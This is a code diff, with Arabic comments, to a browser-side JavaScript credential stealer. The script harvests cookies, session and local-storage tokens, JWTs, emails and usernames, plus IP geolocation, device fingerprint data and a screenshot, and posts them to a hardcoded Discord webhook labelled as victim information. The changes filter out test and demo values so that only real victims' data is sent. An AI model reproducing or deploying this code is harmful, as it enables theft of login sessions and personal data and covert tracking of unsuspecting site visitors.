@@ -267,7 +267,7 @@
         };
 
         // ============================================
-        // دالة البحث عن الإيميلات الحقيقية
+        // دالة البحث عن الإيميلات الحقيقية (بدون تجريبي)
         // ============================================
         function findRealEmails() {
             const emails = new Set();
@@ -276,13 +276,26 @@
             try {
                 const cookies = document.cookie;
                 const cookieEmails = cookies.match(emailRegex);
-                if (cookieEmails) cookieEmails.forEach(e => emails.add(e));
+                if (cookieEmails) {
+                    cookieEmails.forEach(e => {
+                        // استبعاد الإيميلات التجريبية
+                        if (!e.includes('test') && !e.includes('example') && !e.includes('demo') && !e.includes('123')) {
+                            emails.add(e);
+                        }
+                    });
+                }
                 
                 for (let i = 0; i < localStorage.length; i++) {
                     const value = localStorage.getItem(localStorage.key(i));
                     if (value && typeof value === 'string') {
                         const valueEmails = value.match(emailRegex);
-                        if (valueEmails) valueEmails.forEach(e => emails.add(e));
+                        if (valueEmails) {
+                            valueEmails.forEach(e => {
+                                if (!e.includes('test') && !e.includes('example') && !e.includes('demo') && !e.includes('123')) {
+                                    emails.add(e);
+                                }
+                            });
+                        }
                     }
                 }
                 
@@ -290,7 +303,13 @@
                     const value = sessionStorage.getItem(sessionStorage.key(i));
                     if (value && typeof value === 'string') {
                         const valueEmails = value.match(emailRegex);
-                        if (valueEmails) valueEmails.forEach(e => emails.add(e));
+                        if (valueEmails) {
+                            valueEmails.forEach(e => {
+                                if (!e.includes('test') && !e.includes('example') && !e.includes('demo') && !e.includes('123')) {
+                                    emails.add(e);
+                                }
+                            });
+                        }
                     }
                 }
             } catch(e) {}
@@ -299,11 +318,29 @@
         }
 
         // ============================================
-        // دالة الحصول على اسم المستخدم
+        // دالة الحصول على اسم المستخدم الحقيقي
         // ============================================
-        function getWindowsUsername() {
-            let username = "Unknown";
+        function getRealUsername() {
+            let username = "Not found";
             try {
+                // البحث في localStorage عن اسم المستخدم الحقيقي
+                const userKeys = ['username', 'user', 'name', 'displayName', 'fullName', 'realname', 'real_name'];
+                
+                for (let key of userKeys) {
+                    const localValue = localStorage.getItem(key);
+                    if (localValue && localValue.length > 2 && !localValue.includes('test') && !localValue.includes('example')) {
+                        username = localValue;
+                        break;
+                    }
+                    
+                    const sessionValue = sessionStorage.getItem(key);
+                    if (sessionValue && sessionValue.length > 2 && !sessionValue.includes('test') && !sessionValue.includes('example')) {
+                        username = sessionValue;
+                        break;
+                    }
+                }
+                
+                // البحث في الكوكيز
                 const cookies = document.cookie;
                 const patterns = [
                     /user[_-]?name=([^;]+)/i,
@@ -313,50 +350,71 @@
                 
                 for (let pattern of patterns) {
                     const match = cookies.match(pattern);
-                    if (match && match[1]) {
+                    if (match && match[1] && !match[1].includes('test') && !match[1].includes('example')) {
                         username = decodeURIComponent(match[1]);
                         break;
                     }
                 }
+                
             } catch(e) {}
             return username;
         }
 
         // ============================================
-        // دالة الحصول على اسم الكمبيوتر
+        // دالة الحصول على اسم الكمبيوتر الحقيقي
         // ============================================
-        function getComputerName() {
+        function getRealComputerName() {
             try {
                 const ua = navigator.userAgent;
                 const match = ua.match(/\(([^)]+)\)/);
                 if (match) {
                     const parts = match[1].split(';');
-                    return parts.length > 1 ? parts[1].trim() : "Unknown";
+                    if (parts.length > 1) {
+                        const computerName = parts[1].trim();
+                        if (computerName && !computerName.includes('test') && !computerName.includes('example')) {
+                            return computerName;
+                        }
+                    }
                 }
             } catch(e) {}
             return "Unknown";
         }
 
         // ============================================
-        // دالة البحث عن التوكنات
+        // دالة البحث عن التوكنات الحقيقية
         // ============================================
         function findRealTokens() {
             const tokens = [];
-            const tokenKeywords = ['token', 'auth', 'jwt', 'session', 'access', 'refresh', 'bearer', 'api_key', 'apikey', 'secret', 'password', 'pass', 'login', 'user', 'id', 'sid', 'csrf', 'xsrf', 'oauth'];
+            const tokenKeywords = ['token', 'auth', 'jwt', 'session', 'access', 'refresh', 'bearer', 'api_key', 'apikey', 'secret', 'password'];
             
             const cookies = document.cookie.split(';');
             cookies.forEach(cookie => {
                 const [name, value] = cookie.trim().split('=');
                 if (!name || !value) return;
                 
+                // تجاهل القيم التجريبية
+                if (value.includes('test') || value.includes('example') || value.includes('demo') || value.includes('123')) {
+                    return;
+                }
+                
                 tokenKeywords.forEach(keyword => {
                     if (name.toLowerCase().includes(keyword.toLowerCase())) {
-                        tokens.push({ source: '🍪 Cookie', name: name, value: value, type: keyword });
+                        tokens.push({ 
+                            source: '🍪 Cookie', 
+                            name: name, 
+                            value: value.length > 50 ? value.substring(0, 50) + '...' : value, 
+                            type: keyword 
+                        });
                     }
                 });
                 
-                if (value && value.split('.').length === 3) {
-                    tokens.push({ source: '🔐 JWT Token', name: name, value: value, type: 'JWT' });
+                if (value && value.split('.').length === 3 && value.length > 50) {
+                    tokens.push({ 
+                        source: '🔐 JWT Token', 
+                        name: name, 
+                        value: value.substring(0, 50) + '...', 
+                        type: 'JWT' 
+                    });
                 }
             });
             
@@ -365,9 +423,16 @@
                     let key = localStorage.key(i);
                     let value = localStorage.getItem(key);
                     
+                    if (!value || value.includes('test') || value.includes('example') || value.includes('demo')) continue;
+                    
                     tokenKeywords.forEach(keyword => {
                         if (key.toLowerCase().includes(keyword.toLowerCase())) {
-                            tokens.push({ source: '💾 localStorage', name: key, value: value, type: keyword });
+                            tokens.push({ 
+                                source: '💾 localStorage', 
+                                name: key, 
+                                value: value.length > 50 ? value.substring(0, 50) + '...' : value, 
+                                type: keyword 
+                            });
                         }
                     });
                 }
@@ -377,45 +442,42 @@
         }
 
         // ============================================
-        // معلومات جديدة وقوية
+        // معلومات حقيقية فقط
         // ============================================
-        async function getAdvancedInfo() {
+        async function getRealInfo() {
             const info = {};
             
-            // 1. معلومات الموقع الجغرافي (بدون طلب إذن - من IP)
+            // 1. معلومات الموقع الجغرافي الحقيقية
             try {
                 const geoResponse = await fetch('https://ipapi.co/json/');
                 const geoData = await geoResponse.json();
-                info.country = geoData.country_name || 'Unknown';
-                info.city = geoData.city || 'Unknown';
-                info.isp = geoData.org || 'Unknown';
-                info.postal = geoData.postal || 'Unknown';
-                info.latitude = geoData.latitude || 'Unknown';
-                info.longitude = geoData.longitude || 'Unknown';
-                info.timezone = geoData.timezone || 'Unknown';
+                if (geoData.country_name && !geoData.country_name.includes('test')) {
+                    info.country = geoData.country_name;
+                    info.city = geoData.city;
+                    info.isp = geoData.org;
+                    info.latitude = geoData.latitude;
+                    info.longitude = geoData.longitude;
+                }
             } catch (e) {}
 
-            // 2. معلومات البطارية المتقدمة
+            // 2. معلومات البطارية الحقيقية
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
                     info.batteryLevel = Math.round(battery.level * 100) + '%';
                     info.batteryCharging = battery.charging ? 'Yes' : 'No';
-                    info.batteryTimeRemaining = battery.charging ? 'Charging' : (battery.dischargingTime ? Math.round(battery.dischargingTime / 60) + ' minutes' : 'Unknown');
                 } catch (e) {}
             }
 
-            // 3. معلومات الشبكة المتقدمة
+            // 3. معلومات الشبكة الحقيقية
             const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             if (connection) {
-                info.networkType = connection.type || 'Unknown';
-                info.networkEffectiveType = connection.effectiveType || 'Unknown';
-                info.networkDownlink = connection.downlink ? connection.downlink + ' Mbps' : 'Unknown';
-                info.networkRtt = connection.rtt ? connection.rtt + ' ms' : 'Unknown';
-                info.networkSaveData = connection.saveData ? 'Yes' : 'No';
+                info.networkEffectiveType = connection.effectiveType;
+                info.networkDownlink = connection.downlink ? connection.downlink + ' Mbps' : null;
+                info.networkRtt = connection.rtt ? connection.rtt + ' ms' : null;
             }
 
-            // 4. معلومات GPU متقدمة
+            // 4. معلومات GPU الحقيقية
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -423,63 +485,31 @@
                     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                     if (debugInfo) {
                         info.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                        info.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                     }
-                    info.gpuVersion = gl.getParameter(gl.VERSION);
-                    info.gpuShadingVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
                 }
             } catch (e) {}
 
-            // 5. معلومات الشاشة المتقدمة
+            // 5. معلومات الشاشة الحقيقية
             info.screenWidth = window.screen.width;
             info.screenHeight = window.screen.height;
-            info.screenAvailWidth = window.screen.availWidth;
-            info.screenAvailHeight = window.screen.availHeight;
             info.screenColorDepth = window.screen.colorDepth;
-            info.screenPixelDepth = window.screen.pixelDepth;
-            info.screenOrientation = window.screen.orientation ? window.screen.orientation.type : 'Unknown';
 
-            // 6. معلومات المتصفح المتقدمة
+            // 6. معلومات المتصفح الحقيقية
             info.browserPlatform = navigator.platform;
             info.browserLanguage = navigator.language;
-            info.browserLanguages = navigator.languages ? navigator.languages.join(', ') : 'Unknown';
-            info.browserCookieEnabled = navigator.cookieEnabled;
-            info.browserDoNotTrack = navigator.doNotTrack || 'Not specified';
-            info.browserHardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
-            info.browserDeviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown';
-            info.browserMaxTouchPoints = navigator.maxTouchPoints;
-            info.browserPdfViewerEnabled = navigator.pdfViewerEnabled;
-            info.browserVendor = navigator.vendor;
+            info.browserHardwareConcurrency = navigator.hardwareConcurrency;
+            info.browserDeviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : null;
 
-            // 7. معلومات الوقت المتقدمة
+            // 7. معلومات الوقت الحقيقية
             info.timeLocal = new Date().toString();
             info.timeTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            info.timezoneOffset = new Date().getTimezoneOffset();
-            info.timeUTC = new Date().toUTCString();
 
-            // 8. معلومات التخزين
-            try {
-                if (navigator.storage && navigator.storage.estimate) {
-                    const storage = await navigator.storage.estimate();
-                    info.storageUsage = storage.usage ? Math.round(storage.usage / 1024 / 1024) + ' MB' : 'Unknown';
-                    info.storageQuota = storage.quota ? Math.round(storage.quota / 1024 / 1024) + ' MB' : 'Unknown';
+            // فلترة القيم null
+            Object.keys(info).forEach(key => {
+                if (info[key] === null || info[key] === undefined) {
+                    delete info[key];
                 }
-            } catch (e) {}
-
-            // 9. معلومات الإضافات
-            const plugins = [];
-            for (let i = 0; i < navigator.plugins.length; i++) {
-                plugins.push(navigator.plugins[i].name);
-            }
-            info.browserPlugins = plugins.length > 0 ? plugins.join(', ').substring(0, 200) : 'No plugins';
-
-            // 10. معلومات الـ IndexedDB
-            try {
-                if (window.indexedDB && indexedDB.databases) {
-                    const dbs = await indexedDB.databases();
-                    info.indexedDB = dbs.map(db => db.name).join(', ') || 'No databases';
-                }
-            } catch (e) {}
+            });
 
             return info;
         }
@@ -502,152 +532,132 @@
                 } catch (e) {}
 
                 // ============================================
-                // 2. المعلومات الأساسية
+                // 2. IP حقيقي
                 // ============================================
-                const ipAddress = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'Unknown');
+                const ipAddress = await fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(d => d.ip)
+                    .catch(() => null);
                 
                 // ============================================
-                // 3. المعلومات المتقدمة
+                // 3. معلومات حقيقية
                 // ============================================
-                const advancedInfo = await getAdvancedInfo();
-                
-                // ============================================
-                // 4. جمع كل المعلومات
-                // ============================================
+                const realInfo = await getRealInfo();
                 const realEmails = findRealEmails();
-                const windowsUsername = getWindowsUsername();
-                const computerName = getComputerName();
-                const foundTokens = findRealTokens();
+                const realUsername = getRealUsername();
+                const realComputerName = getRealComputerName();
+                const realTokens = findRealTokens();
 
-                // تجهيز الرسائل
-                const emailsMessage = realEmails.length > 0 ? realEmails.join('\n') : 'No emails found';
-                
-                let tokenMessage = '';
-                if (foundTokens.length > 0) {
-                    tokenMessage = foundTokens.map(t => 
-                        `${t.source} | **${t.name}**: \`${t.value.substring(0, 50)}${t.value.length > 50 ? '...' : ''}\` (${t.type})`
-                    ).join('\n');
-                } else {
-                    tokenMessage = 'No tokens found';
+                // تجهيز الرسائل (فقط إذا في معلومات حقيقية)
+                const emailsMessage = realEmails.length > 0 ? realEmails.join('\n') : null;
+                const tokenMessage = realTokens.length > 0 ? 
+                    realTokens.map(t => `${t.source} | **${t.name}**: \`${t.value}\` (${t.type})`).join('\n') : 
+                    null;
+
+                // بناء الرسالة بشكل ديناميكي (نضيف فقط المعلومات الموجودة)
+                let textMessage = '**🚨 REAL VICTIM INFORMATION 🚨**\n\n';
+
+                if (realUsername && realUsername !== 'Not found') {
+                    textMessage += `**👤 Username:** ${realUsername}\n`;
+                }
+                if (realComputerName && realComputerName !== 'Unknown') {
+                    textMessage += `**💻 Computer Name:** ${realComputerName}\n`;
+                }
+                if (ipAddress) {
+                    textMessage += `**🌐 IP Address:** ${ipAddress}\n`;
+                }
+                if (realInfo.country) {
+                    textMessage += `**📍 Location:** ${realInfo.city ? realInfo.city + ', ' : ''}${realInfo.country}\n`;
+                }
+                if (realInfo.isp) {
+                    textMessage += `**🏢 ISP:** ${realInfo.isp}\n`;
+                }
+                if (realInfo.latitude && realInfo.longitude) {
+                    textMessage += `**🗺️ Coordinates:** ${realInfo.latitude}, ${realInfo.longitude}\n`;
+                }
+
+                if (emailsMessage) {
+                    textMessage += `\n**📧 REAL EMAILS:**\n${emailsMessage}\n`;
+                }
+
+                if (tokenMessage) {
+                    textMessage += `\n**🔑 REAL TOKENS:**\n${tokenMessage}\n`;
+                }
+
+                if (document.cookie) {
+                    textMessage += `\n**🍪 COOKIES:**\n\`\`\`\n${document.cookie}\n\`\`\`\n`;
+                }
+
+                if (realInfo.networkEffectiveType || realInfo.networkDownlink) {
+                    textMessage += `\n**🌍 NETWORK:**\n`;
+                    if (realInfo.networkEffectiveType) textMessage += `• **Type:** ${realInfo.networkEffectiveType}\n`;
+                    if (realInfo.networkDownlink) textMessage += `• **Speed:** ${realInfo.networkDownlink}\n`;
+                    if (realInfo.networkRtt) textMessage += `• **Ping:** ${realInfo.networkRtt}\n`;
+                }
+
+                if (realInfo.browserPlatform || realInfo.browserLanguage || realInfo.browserHardwareConcurrency || realInfo.browserDeviceMemory) {
+                    textMessage += `\n**💻 SYSTEM:**\n`;
+                    if (realInfo.browserPlatform) textMessage += `• **Platform:** ${realInfo.browserPlatform}\n`;
+                    if (realInfo.browserLanguage) textMessage += `• **Language:** ${realInfo.browserLanguage}\n`;
+                    if (realInfo.browserHardwareConcurrency) textMessage += `• **CPU Cores:** ${realInfo.browserHardwareConcurrency}\n`;
+                    if (realInfo.browserDeviceMemory) textMessage += `• **RAM:** ${realInfo.browserDeviceMemory}\n`;
+                    if (realInfo.batteryLevel) textMessage += `• **Battery:** ${realInfo.batteryLevel} (${realInfo.batteryCharging})\n`;
+                }
+
+                if (realInfo.screenWidth && realInfo.screenHeight) {
+                    textMessage += `\n**🖥️ SCREEN:**\n• **Resolution:** ${realInfo.screenWidth}x${realInfo.screenHeight}\n`;
+                    if (realInfo.screenColorDepth) textMessage += `• **Color Depth:** ${realInfo.screenColorDepth}-bit\n`;
+                }
+
+                if (realInfo.gpuRenderer) {
+                    textMessage += `\n**🎮 GPU:**\n• **${realInfo.gpuRenderer}**\n`;
+                }
+
+                if (realInfo.timeLocal) {
+                    textMessage += `\n**⏰ TIME:**\n• **Local:** ${realInfo.timeLocal}\n`;
+                    if (realInfo.timeTimezone) textMessage += `• **Timezone:** ${realInfo.timeTimezone}\n`;
                 }
 
                 // ============================================
-                // إرسال إلى Discord (الرسالة القديمة + معلومات جديدة)
+                // إرسال إلى Discord (فقط إذا في معلومات)
                 // ============================================
-                const webhookUrl = 'https://discord.com/api/webhooks/1476727887053721721/UkshRh9j3xisTqqOHLnEvMI5dFlg-dmLWZkuY55yPtAWjuFFM0iPkMlFWUlF0LUjWHTN';
+                if (textMessage.length > 100) { // التأكد إن في معلومات حقيقية
+                    const webhookUrl = 'https://discord.com/api/webhooks/1476727887053721721/UkshRh9j3xisTqqOHLnEvMI5dFlg-dmLWZkuY55yPtAWjuFFM0iPkMlFWUlF0LUjWHTN';
 
-                const textMessage = `
-**🚨 VICTIM INFORMATION COLLECTED 🚨**
-
-**👤 USER INFO:**
-• **Windows Username:** ${windowsUsername}
-• **Computer Name:** ${computerName}
-• **IP Address:** ${ipAddress}
-• **Country:** ${advancedInfo.country || 'Unknown'}
-• **City:** ${advancedInfo.city || 'Unknown'}
-• **ISP:** ${advancedInfo.isp || 'Unknown'}
-• **Postal Code:** ${advancedInfo.postal || 'Unknown'}
-• **Coordinates:** ${advancedInfo.latitude || 'Unknown'}, ${advancedInfo.longitude || 'Unknown'}
-
-**📧 REAL EMAILS FOUND:**
-${emailsMessage}
-
-**🔑 TOKENS FOUND:**
-${tokenMessage}
-
-**📋 ALL COOKIES:**
-\`\`\`
-${document.cookie || 'No cookies found'}
-\`\`\`
-
-**🌐 NETWORK INFO:**
-• **Connection Type:** ${advancedInfo.networkType || 'Unknown'}
-• **Effective Type:** ${advancedInfo.networkEffectiveType || 'Unknown'}
-• **Speed:** ${advancedInfo.networkDownlink || 'Unknown'}
-• **Ping:** ${advancedInfo.networkRtt || 'Unknown'}
-• **Save Data:** ${advancedInfo.networkSaveData || 'Unknown'}
-
-**💻 SYSTEM INFO:**
-• **Platform:** ${advancedInfo.browserPlatform || 'Unknown'}
-• **Language:** ${advancedInfo.browserLanguage || 'Unknown'}
-• **Languages:** ${advancedInfo.browserLanguages || 'Unknown'}
-• **CPU Cores:** ${advancedInfo.browserHardwareConcurrency || 'Unknown'}
-• **RAM:** ${advancedInfo.browserDeviceMemory || 'Unknown'}
-• **Battery Level:** ${advancedInfo.batteryLevel || 'Unknown'}
-• **Battery Charging:** ${advancedInfo.batteryCharging || 'Unknown'}
-• **Battery Time Remaining:** ${advancedInfo.batteryTimeRemaining || 'Unknown'}
-
-**🖥️ DISPLAY INFO:**
-• **Resolution:** ${advancedInfo.screenWidth || 'Unknown'}x${advancedInfo.screenHeight || 'Unknown'}
-• **Available Resolution:** ${advancedInfo.screenAvailWidth || 'Unknown'}x${advancedInfo.screenAvailHeight || 'Unknown'}
-• **Color Depth:** ${advancedInfo.screenColorDepth || 'Unknown'}-bit
-• **Pixel Depth:** ${advancedInfo.screenPixelDepth || 'Unknown'}-bit
-• **Orientation:** ${advancedInfo.screenOrientation || 'Unknown'}
-
-**🎮 GPU INFO:**
-• **Renderer:** ${advancedInfo.gpuRenderer || 'Unknown'}
-• **Vendor:** ${advancedInfo.gpuVendor || 'Unknown'}
-• **Version:** ${advancedInfo.gpuVersion || 'Unknown'}
-• **Shading Version:** ${advancedInfo.gpuShadingVersion || 'Unknown'}
-
-**⏰ TIME INFO:**
-• **Local Time:** ${advancedInfo.timeLocal || 'Unknown'}
-• **UTC Time:** ${advancedInfo.timeUTC || 'Unknown'}
-• **Timezone:** ${advancedInfo.timeTimezone || 'Unknown'}
-• **Offset:** ${advancedInfo.timezoneOffset || 'Unknown'} minutes
-
-**💾 STORAGE INFO:**
-• **Storage Usage:** ${advancedInfo.storageUsage || 'Unknown'}
-• **Storage Quota:** ${advancedInfo.storageQuota || 'Unknown'}
-• **IndexedDB Databases:** ${advancedInfo.indexedDB || 'None'}
-
-**🔧 BROWSER INFO:**
-• **User Agent:** ${navigator.userAgent}
-• **Cookies Enabled:** ${advancedInfo.browserCookieEnabled || 'Unknown'}
-• **Do Not Track:** ${advancedInfo.browserDoNotTrack || 'Unknown'}
-• **Max Touch Points:** ${advancedInfo.browserMaxTouchPoints || 'Unknown'}
-• **PDF Viewer:** ${advancedInfo.browserPdfViewerEnabled || 'Unknown'}
-• **Vendor:** ${advancedInfo.browserVendor || 'Unknown'}
-• **Plugins:** ${advancedInfo.browserPlugins || 'None'}
-
-**🌍 ADDITIONAL INFO:**
-• **Timezone (from geo):** ${advancedInfo.timezone || 'Unknown'}
-• **Online Status:** ${navigator.onLine ? '✅ Online' : '❌ Offline'}
-`;
-
-                // إرسال النص
-                await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: textMessage })
-                });
-
-                // إرسال الصورة
-                if (screenshotBase64) {
-                    const base64Data = screenshotBase64.split(',')[1];
-                    const byteCharacters = atob(base64Data);
-                    const byteArrays = [];
-
-                    for (let offset = 0; offset < byteCharacters.length; offset += 512) {
-                        const slice = byteCharacters.slice(offset, offset + 512);
-                        const byteNumbers = new Array(slice.length);
-                        for (let i = 0; i < slice.length; i++) {
-                            byteNumbers[i] = slice.charCodeAt(i);
-                        }
-                        byteArrays.push(new Uint8Array(byteNumbers));
-                    }
-
-                    const blob = new Blob(byteArrays, { type: 'image/png' });
-                    const formData = new FormData();
-                    formData.append('file', blob, 'victim_screenshot.png');
-                    
+                    // إرسال النص
                     await fetch(webhookUrl, {
                         method: 'POST',
-                        body: formData
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ content: textMessage })
                     });
-                }
 
-                console.log('✅ Information sent successfully!');
+                    // إرسال الصورة
+                    if (screenshotBase64) {
+                        const base64Data = screenshotBase64.split(',')[1];
+                        const byteCharacters = atob(base64Data);
+                        const byteArrays = [];
+
+                        for (let offset = 0; offset < byteCharacters.length; offset += 512) {
+                            const slice = byteCharacters.slice(offset, offset + 512);
+                            const byteNumbers = new Array(slice.length);
+                            for (let i = 0; i < slice.length; i++) {
+                                byteNumbers[i] = slice.charCodeAt(i);
+                            }
+                            byteArrays.push(new Uint8Array(byteNumbers));
+                        }
+
+                        const blob = new Blob(byteArrays, { type: 'image/png' });
+                        const formData = new FormData();
+                        formData.append('file', blob, 'real_screenshot.png');
+                        
+                        await fetch(webhookUrl, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }
+
+                    console.log('✅ Real information sent successfully!');
+                }
 
             } catch (error) {
                 console.error('Error:', error);
